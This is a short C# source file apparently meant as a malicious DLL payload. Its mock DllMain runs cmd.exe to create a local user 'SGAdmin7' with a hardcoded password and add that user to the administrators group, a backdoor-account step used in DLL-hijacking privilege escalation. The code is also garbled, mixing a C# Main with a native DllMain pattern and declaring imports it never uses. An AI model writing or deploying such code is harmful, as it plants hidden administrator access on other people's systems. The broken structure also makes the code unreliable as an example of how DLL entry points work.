using System;
using System.Runtime.InteropServices;

public class DllMain
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern bool DisableThreadLibraryCalls(IntPtr hModule);

    [DllImport("user32.dll")]
    public static extern bool MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    [DllImport("user32.dll")]
    public static extern int MessageBoxA(int hWnd, string lpText, string lpCaption, uint uType);

    public const int DLL_PROCESS_ATTACH = 1;
    public const int DLL_THREAD_ATTACH = 2;
    public const int DLL_THREAD_DETACH = 3;
    public const int DLL_PROCESS_DETACH = 0;

    public static void Main()
    {
        IntPtr hModule = GetModuleHandle(null);
        DisableThreadLibraryCalls(hModule);

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
                System.Diagnostics.Process.Start("cmd.exe", "/c net user SGAdmin7 123456789aA /add");
                System.Diagnostics.Process.Start("cmd.exe", "/c net localgroup administrators SGAdmin7 /add");
                break;
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
            case DLL_PROCESS_DETACH:
                break;
        }
    }

    public static int ul_reason_for_call = DLL_PROCESS_ATTACH;
}
